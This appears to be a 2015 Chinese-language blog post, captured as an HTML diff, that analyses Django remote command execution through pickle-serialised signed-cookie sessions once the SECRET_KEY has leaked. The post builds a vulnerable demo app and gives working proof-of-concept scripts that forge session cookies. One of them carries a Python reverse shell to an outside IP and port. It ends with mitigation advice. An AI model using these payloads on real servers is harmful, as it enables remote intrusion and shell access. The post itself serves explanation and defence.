@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="一、背景首先简单谈谈 Python 中的序列化模块。Python 中关于 pickle 序列化导致的任意命令执行问题早在 2002 年时就已经被提及，经过了长时间的测试和挖掘，其利用方法趋于固定，其 demo 如下： serializer.py （用以生成序列化后的 payload） import base64try:    import cPickle as pickleexcept:    i">
+<meta name="keywords" content="web,security,exploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Django 远程命令执行漏洞详解">
+<meta property="og:url" content="http://rickgray.me/2015/09/12/django-command-execution-analysis/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="一、背景首先简单谈谈 Python 中的序列化模块。Python 中关于 pickle 序列化导致的任意命令执行问题早在 2002 年时就已经被提及，经过了长时间的测试和挖掘，其利用方法趋于固定，其 demo 如下： serializer.py （用以生成序列化后的 payload） import base64try:    import cPickle as pickleexcept:    i">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/1.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/2.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/3.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/4.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/5.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/6.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/7.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/8.png">
+<meta property="og:updated_time" content="2018-04-24T15:48:57.517Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Django 远程命令执行漏洞详解">
+<meta name="twitter:description" content="一、背景首先简单谈谈 Python 中的序列化模块。Python 中关于 pickle 序列化导致的任意命令执行问题早在 2002 年时就已经被提及，经过了长时间的测试和挖掘，其利用方法趋于固定，其 demo 如下： serializer.py （用以生成序列化后的 payload） import base64try:    import cPickle as pickleexcept:    i">
+<meta name="twitter:image" content="http://rickgray.me/images/articles/2015-09-12-django-command-execution-analysis/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Django 远程命令执行漏洞详解</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/09/18/wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2015/09/03/solutions-to-cross-domain-in-browser/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/09/12/django-command-execution-analysis/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&text=Django 远程命令执行漏洞详解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&is_video=false&description=Django 远程命令执行漏洞详解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Django 远程命令执行漏洞详解&body=Check out this article: http://rickgray.me/2015/09/12/django-command-execution-analysis/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&name=Django 远程命令执行漏洞详解&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、背景"><span class="toc-number">1.</span> <span class="toc-text">一、背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、分析"><span class="toc-number">2.</span> <span class="toc-text">二、分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、Demo"><span class="toc-number">3.</span> <span class="toc-text">三、Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、小结"><span class="toc-number">4.</span> <span class="toc-text">四、小结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Django 远程命令执行漏洞详解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-09-11T16:00:00.000Z" itemprop="datePublished">2015-09-12</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/exploit/">exploit</a>, <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h3><p>首先简单谈谈 Python 中的序列化模块。Python 中关于 <code>pickle</code> 序列化导致的任意命令执行问题早在 2002 年时就已经被提及，经过了长时间的测试和挖掘，其利用方法趋于固定，其 demo 如下：</p>
+<p><code>serializer.py</code> （用以生成序列化后的 payload）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> cPickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Whoami</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'whoami'</span>, ))</span><br><span class="line">    </span><br><span class="line">sess = base64.b64encode(pickle.dumps(Whoami()))</span><br><span class="line"><span class="keyword">print</span> sess</span><br></pre></td></tr></table></figure>
+<p>代码执行后得到序列化后的字串：<code>Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScDQKLg==</code></p>
+<p><code>unserializer.py</code>（用以反序列化字符串生成对象）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> cPickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
+<p>将前面的得到的序列化字串 <code>Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScDQKLg==</code> 作为代码参数传入，得到输出：</p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/1.png" alt=""></p>
+<p>可以看到 <code>whoami</code> 命令得到了执行，关于 <code>pickle</code> 的详细说明可参考<a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="noopener">官方文档</a>。</p>
+<h3 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h3><p>简单的说明了 Python 中序列化导致的任意命令执行问题后，再来看看 Django 中与其相关的地方。（下面以 Django 1.5.12 作为环境进行示例说明）</p>
+<p>在 Django 中，老版本（1.6以下）默认使用 <code>PickleSerializer()</code> 对 <code>session</code> 进行序列化，高版本中则使用 <code>JSONSerializer()</code> 对 <code>session</code> 进行序列化操作。</p>
+<p>而 <code>PickleSerializer()</code> 的序列化则使用了 Python 中内置模块 <code>cPickle</code> 和 <code>pickle</code>。其类定义位于 <code>django/contrib/sessions/serializers.py</code> 中：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.signing <span class="keyword">import</span> JSONSerializer <span class="keyword">as</span> BaseJSONSerializer</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> django.utils.six.moves <span class="keyword">import</span> cPickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'loads() method called'</span></span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSONSerializer = BaseJSONSerializer</span><br></pre></td></tr></table></figure>
+<p>若 Django 项目中配置了 session 序列化处理为 <code>PickleSerializer()</code>，即：</p>
+<pre><code>SESSION_SERIALIZER = &apos;django.contrib.sessions.serializers.PickleSerializer&apos;
+</code></pre><p>其所有关于用户 session 的操作（序列化，反序列化等）都会使用其配置的方法对其进行处理。</p>
+<p>Django 在处理用户请求和响应用户请求时都会调用会话中间件对其进行操作，中间件定义位于 <code>django/ontrib/sessions/middleware.py</code>，内容如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        engine = import_module(settings.SESSION_ENGINE)</span><br><span class="line">        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, <span class="keyword">None</span>)  <span class="comment"># 从用户请求的 Cookies 中获取配置中设置好的 session 名，默认为 "sessionid"</span></span><br><span class="line">        request.session = engine.SessionStore(session_key)  <span class="comment"># 使用 session 引擎对获取的 session 值进行初始化操作 SessionStore()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, request, response)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        If request.session was modified, or if the configuration is to save the</span></span><br><span class="line"><span class="string">        session every time, save the changes and set a session cookie.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    (...省略)</span><br></pre></td></tr></table></figure>
+<p>当用户访问时会初始化 session 处理类，若服务端对用户会话信息进行访问或者修改，都会反序列化用户所传递的 session 值，然后从中读取数据。</p>
+<p>综上看来，如果 session 可控，攻击者就可以构造出包含有恶意代码的序列化字串，将其传递给服务器，服务器在解析即反序列化 session 的同时，就有可能导致任意命令执行。当然了，攻击者想要成功构造出有效的 session 值，有两个必要条件：</p>
+<ol>
+<li>session 可控（即以 Cookies 等形式存储于客户端）</li>
+<li>服务器上用以加密、验证等操作使用的 SECRET_KEY</li>
+</ol>
+<p>关于第一点，Django 中有多种 session 存储的方式，如：db、file、cookies 等。假设某一个 Django 项目使用了 cookies 作为它的 session 处理引擎，即在 <code>settings.py</code> 中有如下配置：</p>
+<pre><code>SESSION_ENGINE = &apos;django.contrib.sessions.backends.signed_cookies&apos;
+</code></pre><p>这样一来，第一条件就可以满足了，所有关于用户的会话信息都以密文的形式存储在客户端。（事实证明，这样配置的 Django 项目的确不在少数）</p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/2.png" alt=""></p>
+<p>使用了 cookies 作为 session 处理引擎，其对 session 的读取会通过前面提到的序列化处理过程进行处理。关键代码位于 <code>django/contrib/sessions/backends/signed_cookies.py</code> 中：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionStore</span><span class="params">(SessionBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 当后端访问会话数据时（例如 request.session['admin']）会使用 load() 函数载入加密的 session 数据，</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        We load the data from the key itself instead of fetching from</span></span><br><span class="line"><span class="string">        some external data store. Opposite of _get_session_key(),</span></span><br><span class="line"><span class="string">        raises BadSignature if signature fails.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> signing.loads(self.session_key,  <span class="comment"># 加密后的 session 值</span></span><br><span class="line">                serializer=self.serializer,  <span class="comment"># 若配置中设置了 PickleSerializer()，最终会调用 pickle 或者 cPickle 模块</span></span><br><span class="line">                <span class="comment"># This doesn't handle non-default expiry dates, see #19201</span></span><br><span class="line">                max_age=settings.SESSION_COOKIE_AGE,  <span class="comment"># session 的过期时间</span></span><br><span class="line">                salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>)  <span class="comment"># 用以验证 session 有效性的盐值，默认为项目中的 SECRET_KEY</span></span><br><span class="line">        <span class="keyword">except</span> (signing.BadSignature, ValueError):</span><br><span class="line">            <span class="comment"># 当用户的 session 验证失败时，会创建新的 session</span></span><br><span class="line">            self.create()</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    (...省略)</span><br></pre></td></tr></table></figure>
+<p>关于第一点的说明到这里就足够了。再来说说第二条件即安全密钥-<code>SECRET_KEY</code>，作为 Django 项目中最核心的密钥，通常情况下是不可能外泄的，但是凡事都有不能预料的时候，例如，开发人员疏忽将 <code>SECRET_KEY</code> 作为一个 api 密钥加载于 JS 中，又或者项目中存在任意文件下载漏洞，攻击者通过下载 <code>settings.py</code> 文件读取到了密钥 <code>SECRET_KEY</code> 的值，其他种种诸如此类的原因致使 <code>SECRET_KEY</code> 泄露成为可能。</p>
+<p>若同时满足上述两个条件，并且使用了 <code>PickleSerializer()</code> 序列化处理过程，那么攻击者就可以构造出恶意的序列化字串，传递给服务器，致使服务器在访问或修改会话信息时调用了相应引擎的 <code>load()</code> 函数，反序列化 session 加密字串，触发 <code>pickle</code> 任意命令执行漏洞。</p>
+<h3 id="三、Demo"><a href="#三、Demo" class="headerlink" title="三、Demo"></a>三、Demo</h3><p>下面，我们就假设有这么一个站点，同时满足了上面所提到的两个必要条件：<code>session可控</code> 和 <code>SECRET_KEY泄露</code>，同时序列化过程使用 <code>PickleSerializer()</code>，建立一个测试项目名为 <code>demo</code>（依次执行下列命令，virtualenv 为 Python 虚拟环境管理，请自行检查或安装）。</p>
+<pre><code>virtualenv --distribute django
+cd django
+. bin/activate
+pip install django==1.5.12
+django-admin.py startproject demo
+cd demo/
+python manage.py startapp vuln
+</code></pre><p>首先给出整个项目的目录树：</p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/3.png" alt=""></p>
+<p>首先设置用户会话引擎和序列化过程处理（1.5.12已将 startproject 创建的项目中的 SESSION_SERIALIZE 设置为了 JSONSerializer，所以按此流程进行测试的时候不要感到奇怪），在 demo/settings.py 文件中设置 <code>SESSION_ENGINE</code> 和 <code>SESSION_SERIALIZER</code>，并将创建的子应用 <code>vuln</code> 加入到 <code>INSTALL_APPS</code> 中：</p>
+<pre><code>SESSION_ENGINE = &apos;django.contrib.sessions.backends.signed_cookies&apos;
+SESSION_SERIALIZER = &apos;django.contrib.sessions.serializers.PickleSerializer&apos;
+
+...
+
+INSTALLED_APPS += (&apos;vuln&apos;, )
+</code></pre><p>通过刚才的命令，已经在 <code>demo</code> 项目中创建了一个子应用 <code>vuln</code>，编辑 <code>vuln/views.py</code> 文件，为其增加需要进行测试的视图，内容如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'This is index page'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        admin = request.session[<span class="string">'admin'</span>]</span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">'Get out of here'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Hello admin'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Secret key is: %s'</span> % settings.SECRET_KEY)</span><br></pre></td></tr></table></figure>
+<p>随后配置路由信息 <code>demo/urls.py</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> patterns, include, url</span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment the next two lines to enable the admin:</span></span><br><span class="line"><span class="comment"># from django.contrib import admin</span></span><br><span class="line"><span class="comment"># admin.autodiscover()</span></span><br><span class="line"></span><br><span class="line">urlpatterns = patterns(<span class="string">'vuln.views'</span>,</span><br><span class="line">	url(<span class="string">r'^$'</span>, <span class="string">'index'</span>),</span><br><span class="line">    url(<span class="string">r'^key/$'</span>, <span class="string">'key'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/$'</span>, <span class="string">'admin'</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>将 <code>demo</code> 项目跑起来：</p>
+<pre><code>python manage.py runserver 127.0.0.1:8000
+</code></pre><p>这里创建了3个视图 <code>index</code>，<code>admin</code> 和 <code>key</code>，为了测试方便，<code>http://127.0.0.1:8000/key/</code> 页面直接输出了该 Django 项目中的 <code>SECRET_KEY</code> 值。<code>http://127.0.0.1:8000/admin/</code> 页面为一个管理员页面，后端会尝试读取会话信息中 request.session[‘admin’] 的值，若存在则返回 “Hello admin”，不存在返回 “Get out of here”。</p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/4.png" alt=""></p>
+<p>此处 <code>SECRET_KEY</code> 值为：<code>zur%eblm54)e)ox&amp;-xzbwonmx$=+ijh3dl&amp;6m-mx+1^y(-i09y</code></p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/5.png" alt=""></p>
+<p>在用户访问管理页面时，后端尝试读取了 session[‘admin’] 的值，根据文章第二部分的分析结合此处的模拟环境，我们可以通过得到的 <code>SECRET_KEY</code> 来构造一个恶意的序列化字串来执行任意命令。</p>
+<p>示例 PoC 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">'zur%eblm54)e)ox&amp;-xzbwonmx$=+ijh3dl&amp;6m-mx+1^y(-i09y'</span>)  <span class="comment"># SECRET_KEY 参数的值为 demo Django 项目的 SECRET_KEY 值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CreateTmpFile</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">'touch'</span>,</span><br><span class="line">                  <span class="string">'/tmp/vulnerable'</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line">    obj=CreateTmpFile(),</span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line">    salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> sess</span><br></pre></td></tr></table></figure>
+<p>运行该 PoC 后，得到加密后的 session 值：</p>
+<pre><code>gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUFdG91Y2hxA1UPL3RtcC92dWxuZXJhYmxlcQRlhVJxBS4:1Zb63z:AUICT5WAqW3JrFNYpeR0remUBHI
+</code></pre><p>然后直接请求 <code>http://127.0.0.1:8000/admin/</code> 并附上相应的 session 值。</p>
+<pre><code>curl http://127.0.0.1:8000/admin/ --cookie &quot;sessionid=gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUFdG91Y2hxA1UPL3RtcC92dWxuZXJhYmxlcQRlhVJxBS4:1Zb63z:AUICT5WAqW3JrFNYpeR0remUBHI&quot;
+</code></pre><p>然后查看 <code>/tmp</code> 目录，发现成功创建了 <code>vulnerable</code> 文件，命令得到了执行：</p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/6.png" alt=""></p>
+<p>同时服务器也抛出错误：</p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/7.png" alt=""></p>
+<p>下面再给出一 PoC 用以 GetShell：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">'zur%eblm54)e)ox&amp;-xzbwonmx$=+ijh3dl&amp;6m-mx+1^y(-i09y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetShellWithPython</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">'python'</span>,</span><br><span class="line">                  <span class="string">'-c'</span>,</span><br><span class="line">                  <span class="string">'import socket,subprocess,os;'</span></span><br><span class="line">                  <span class="string">'s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'</span></span><br><span class="line">                  <span class="string">'s.connect(("103.224.82.158",31337));'</span></span><br><span class="line">                  <span class="string">'os.dup2(s.fileno(),0);'</span></span><br><span class="line">                  <span class="string">'os.dup2(s.fileno(),1);'</span></span><br><span class="line">                  <span class="string">'os.dup2(s.fileno(),2);'</span></span><br><span class="line">                  <span class="string">'subprocess.call(["/bin/sh","-i"]);'</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line">    obj=GetShellWithPython(),</span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line">    salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> sess</span><br></pre></td></tr></table></figure>
+<p>运行该 PoC 后，得到加密后的 session 值：</p>
+<pre><code>gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUGcHl0aG9ucQNVAi1jcQRV12ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMDMuMjI0LjgyLjE1OCIsMzEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7cQVlhVJxBi4:1Zb69o:JrnUm9KCbIDWVh13g2i5rY0o11E
+</code></pre><p>然后请求 <code>http://127.0.0.1:8000/admin/</code> 并附上相应的 session 值。</p>
+<p><img src="/images/articles/2015-09-12-django-command-execution-analysis/8.png" alt=""></p>
+<p>可以看到，已经成功 GetShell。</p>
+<h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>通过两个简单的例子来说明了 Django 中如何利用配置缺陷来进行任意命令执行。实例中虽然使用的是 Django-1.5.12 版本，但是需要注意的是，只要满足 2 个必要条件以及使用了 <code>PickleSerializer()</code> 处理序列化过程，必然会存在反序列化导致任意命令执行的问题。</p>
+<p>避免该问题的最直接方法就是用 <code>JSONSerializer()</code> 来代替 <code>PickleSerializer()</code> 进行序列化处理，以及避免使用 Cookies 来存放重要的会话信息。</p>
+<p>本文虽只给出了 Demo 示例来演示 Django 任意命令执行过程，但足以说明该问题的严重性，应该得到广大开发者（特别是 Python 使用者们）的重视。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
